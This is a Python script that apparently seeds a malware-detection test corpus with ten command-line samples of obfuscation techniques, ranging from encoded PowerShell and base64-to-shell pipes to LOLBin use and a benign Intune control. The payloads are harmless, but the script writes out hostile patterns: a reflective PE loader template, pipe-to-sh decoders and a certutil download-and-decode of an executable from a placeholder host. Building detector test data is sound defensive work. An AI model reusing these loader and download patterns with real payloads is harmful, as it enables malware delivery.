"""Seed the NVKC command_line corpus with 10 curated deterministic
samples. Idempotent — running twice produces the same descriptor
YAMLs. Owner-only script (not part of production).

Each seed covers a distinct deterministic technique so the corpus
grows outward from a solid coverage foundation:

    01 · plain PowerShell -EncodedCommand (utf-16 b64)
    02 · PowerShell -EncodedCommand → gzip → PE (flagship)
    03 · bash echo | base64 -d pipeline
    04 · CMD /c set + call reassembly
    05 · WMIC LOLBin abuse
    06 · certutil -decode LOLBin
    07 · Linux base64 -> gunzip -> sh
    08 · Nested PowerShell FromBase64String (no gzip)
    09 · JavaScript unescape + eval
    10 · Benign enterprise · Intune device-enrollment PS

Baselines are left empty on first seed — run
`pytest backend/nvkc/harness/ --nvkc-update-baseline` (owner-only) to
lock the initial fingerprints after review.
"""
from __future__ import annotations

import base64
import gzip
import io
import os
import textwrap
from pathlib import Path

import yaml

HERE = Path(__file__).resolve().parent


# ────────────────────────────────────────────────────────────────────
# Tiny analyst-safe PE stub (1024 bytes, MZ + PE header + empty body)
# ────────────────────────────────────────────────────────────────────
def _build_analyst_safe_pe() -> bytes:
    buf = bytearray(1024)
    buf[0:2] = b"MZ"
    buf[0x3c:0x40] = (0x80).to_bytes(4, "little")   # e_lfanew
    buf[0x80:0x84] = b"PE\x00\x00"
    buf[0x84:0x86] = (0x14c).to_bytes(2, "little")  # i386
    buf[0x86:0x88] = (0).to_bytes(2, "little")      # no sections
    return bytes(buf)


def _ps_encoded_command(script: str) -> str:
    return "powershell.exe -EncodedCommand " + base64.b64encode(
        script.encode("utf-16-le")
    ).decode("ascii")


def _ps_encoded_gzip_pe_wrapper() -> str:
    pe = _build_analyst_safe_pe()
    gz = gzip.compress(pe)
    inner_b64 = base64.b64encode(gz).decode("ascii")
    script = (
        f"$d=[Convert]::FromBase64String('{inner_b64}');"
        f"$s=New-Object IO.MemoryStream(,$d);"
        f"$g=New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress);"
        f"$r=New-Object IO.MemoryStream;$g.CopyTo($r);"
        f"[Reflection.Assembly]::Load($r.ToArray())"
    )
    return _ps_encoded_command(script)


# ────────────────────────────────────────────────────────────────────
# Seed definitions
# ────────────────────────────────────────────────────────────────────
def _seeds():
    return [
        {
            "slug": "cl-01-ps-encoded-command-hello",
            "track": "command_line",
            "description": "PowerShell -EncodedCommand carrying a printable script",
            "tags": ["powershell", "encodedcommand", "utf16le", "base64", "T1059.001"],
            "input": _ps_encoded_command("Write-Host 'hello from NVKC'"),
        },
        {
            "slug": "cl-02-ps-encoded-gzip-pe",
            "track": "command_line",
            "description": "PowerShell -EncodedCommand -> gzip -> PE (flagship recovery)",
            "tags": ["powershell", "encodedcommand", "gzip", "pe", "T1059.001", "T1027"],
            "input": _ps_encoded_gzip_pe_wrapper(),
        },
        {
            "slug": "cl-03-bash-echo-b64-pipe",
            "track": "command_line",
            "description": "bash echo <b64> | base64 -d pipeline",
            "tags": ["bash", "base64", "T1140"],
            "input": "echo " + base64.b64encode(b"id;uname -a").decode("ascii")
                     + " | base64 -d | sh",
        },
        {
            "slug": "cl-04-cmd-set-call-reassembly",
            "track": "command_line",
            "description": "CMD /c set + call chunk reassembly",
            "tags": ["cmd", "obfuscation", "reassembly", "T1027"],
            "input": (
                'cmd.exe /c "set a=power&set b=shell&call %a%%b%.exe '
                '-Command Write-Host hi"'
            ),
        },
        {
            "slug": "cl-05-wmic-lolbin",
            "track": "command_line",
            "description": "WMIC LOLBin process invocation",
            "tags": ["wmic", "lolbin", "T1218", "T1047"],
            "input": ('wmic.exe process call create '
                      '"powershell.exe -Command Write-Host wmic"'),
        },
        {
            "slug": "cl-06-certutil-decode-lolbin",
            "track": "command_line",
            "description": "certutil -decode LOLBin decoding a payload file",
            "tags": ["certutil", "lolbin", "T1140", "T1027"],
            "input": "certutil.exe -urlcache -split -f "
                     "https://example.invalid/x.b64 x.b64 && "
                     "certutil.exe -decode x.b64 x.exe",
        },
        {
            "slug": "cl-07-linux-base64-gunzip-sh",
            "track": "command_line",
            "description": "Linux base64 → gunzip → sh loader",
            "tags": ["linux", "base64", "gzip", "sh", "T1140"],
            "input": ('echo ' + base64.b64encode(
                gzip.compress(b"echo linux-loader")).decode("ascii")
                     + ' | base64 -d | gunzip | sh'),
        },
        {
            "slug": "cl-08-ps-frombase64string-simple",
            "track": "command_line",
            "description": "PowerShell [Convert]::FromBase64String('...') without gzip",
            "tags": ["powershell", "frombase64string", "T1059.001"],
            "input": "powershell.exe -Command \"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"
                     + base64.b64encode(b"Write-Host ps-frombase64-only").decode("ascii")
                     + "'))\"",
        },
        {
            "slug": "cl-09-javascript-unescape-eval",
            "track": "command_line",
            "description": "JavaScript unescape() + eval() obfuscation",
            "tags": ["javascript", "unescape", "eval", "T1059.007"],
            "input": r"eval(unescape('%77%69%6e%64%6f%77%2e%61%6c%65%72%74%28%27%68%69%27%29'))",
        },
        {
            "slug": "cl-10-benign-intune-enrollment",
            "track": "benign_enterprise",
            "description": "Intune device-enrollment PowerShell (benign FP guard)",
            "tags": ["intune", "benign", "enterprise", "powershell"],
            "input": (
                'powershell.exe -ExecutionPolicy Bypass -NoProfile '
                '-File "C:\\ProgramData\\Microsoft\\IntuneManagementExtension'
                '\\Scripts\\EnrollDevice.ps1" -DeviceName "%COMPUTERNAME%"'
            ),
            "benign": True,
        },
    ]


# ────────────────────────────────────────────────────────────────────
# Materialise
# ────────────────────────────────────────────────────────────────────
def build():
    for s in _seeds():
        track_dir = HERE / s["track"]
        track_dir.mkdir(parents=True, exist_ok=True)
        desc = {
            "slug":        s["slug"],
            "version":     "1.0",
            "track":       s["track"],
            "description": s["description"],
            "tags":        s["tags"],
            "input":       {"kind": "text", "inline": s["input"]},
            "expected": {
                "terminal_state":          None,     # locked by --nvkc-update-baseline
                "artifact_types":          [],
                "mitre":                   [],
                "attack_fingerprint_hash": None,
                "behavior_codes":          [],
                "ioc_kinds":               [],
                "benign":                  bool(s.get("benign", False)),
            },
        }
        out = track_dir / f"{s['slug']}.nvkc.yaml"
        out.write_text(
            yaml.safe_dump(desc, sort_keys=True, default_flow_style=False),
            encoding="utf-8",
        )
    print(f"wrote {len(_seeds())} NVKC seed descriptors under {HERE}")


if __name__ == "__main__":
    build()
